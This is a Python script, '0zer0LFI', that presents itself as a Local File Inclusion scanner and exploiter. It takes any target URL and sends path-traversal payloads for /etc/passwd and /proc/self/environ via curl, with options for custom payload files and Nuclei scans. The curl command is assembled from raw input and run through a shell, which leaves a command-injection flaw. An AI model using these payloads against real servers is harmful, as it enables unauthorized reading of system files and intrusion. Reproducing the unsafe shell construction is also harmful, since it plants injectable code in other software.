#!/usr/bin/python3
# 0zer0LFI - Local File Inclusion Scanner & Exploiter
# Author: AryzXploit

import os
import sys
import json
import pyfiglet
import time
import subprocess
from termcolor import colored

secret_path = os.path.expanduser('~/.0zer0LFI/')
auth_status_file = os.path.join(secret_path, 'auth_status.json')

def verify_auth():
    """Verifikasi token sebelum menjalankan tools"""
    if not os.path.exists(auth_status_file):
        print(colored("❌ Unauthorized Access! Please login through LoginPage.py.", 'red'))
        sys.exit(1)

    with open(auth_status_file, 'r') as file:
        auth_status = json.load(file)

    if 'token' not in auth_status:
        print(colored("❌ Unauthorized Access! Please login.", 'red'))
        sys.exit(1)

    user_token = input(colored("🔑 Enter your token: ", 'cyan'))
    if user_token != auth_status["token"]:
        print(colored("❌ Invalid token! Please login again.", 'red'))
        sys.exit(1)

verify_auth()
print(colored("✅ Access Granted!", 'green'))
time.sleep(2)

LFI_PAYLOADS = [
    "../../../../../../etc/passwd",
    "../../../../../../proc/self/environ"
]

def scan_lfi(url, custom_payloads=None):
    """Scan LFI dengan payload default atau custom"""
    print(colored(f'🔍 Scanning {url} for LFI vulnerabilities...', 'yellow'))

    payloads = custom_payloads if custom_payloads else LFI_PAYLOADS

    for payload in payloads:
        print(colored(f"[-] Testing payload: {payload}", 'cyan'))
        command = f"curl -s '{url}?file={payload}'"

        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            if "root:x:" in result.stdout:
                print(colored(f"[✅] Vulnerable with payload: {payload}", 'green'))
            else:
                print(colored('[❌] Not Vulnerable', 'red'))
        except Exception as e:
            print(colored(f'[!] Error: {e}', 'red'))

def scan_nuclei(url):
    """Jalankan scan menggunakan Nuclei"""
    print(colored(f'🚀 Running Nuclei scan on {url}...', 'yellow'))
    os.system(f"nuclei -u {url}")

def load_payloads_from_file(filename):
    """Load payload dari file"""
    if not os.path.exists(filename):
        print(colored(f"❌ File {filename} not found!", 'red'))
        return []

    with open(filename, 'r') as file:
        return [line.strip() for line in file.readlines() if line.strip()]

def main():
    while True:
        os.system('clear')
        print(colored(pyfiglet.figlet_format('0zer0LFI', font='slant'), 'red'))
        print(colored('1. Single URL Scan (Default Payloads)', 'yellow'))
        print(colored('2. Single URL Scan (Manual Payload)', 'yellow'))
        print(colored('3. Single URL Scan (Load Payload from File)', 'yellow'))
        print(colored('4. Run Nuclei Scan', 'yellow'))
        print(colored('0. Exit', 'yellow'))

        choice = input(colored('\n🤖 Pilih opsi: ', 'yellow'))

        if choice == '1':
            url = input(colored('🌐 Masukkan URL target: ', 'yellow'))
            scan_lfi(url)
        elif choice == '2':
            url = input(colored('🌐 Masukkan URL target: ', 'yellow'))
            custom_payload = input(colored('📌 Masukkan payload LFI: ', 'yellow'))
            scan_lfi(url, [custom_payload])
        elif choice == '3':
            url = input(colored('🌐 Masukkan URL target: ', 'yellow'))
            file_path = input(colored('📂 Masukkan path file payloads: ', 'yellow'))
            payloads = load_payloads_from_file(file_path)
            if payloads:
                scan_lfi(url, payloads)
        elif choice == '4':
            url = input(colored('🌐 Masukkan URL target: ', 'yellow'))
            scan_nuclei(url)
        elif choice == '0':
            break
        else:
            print(colored("❌ Invalid option. Try again.", 'red'))
            time.sleep(2)

if __name__ == '__main__':
    main()
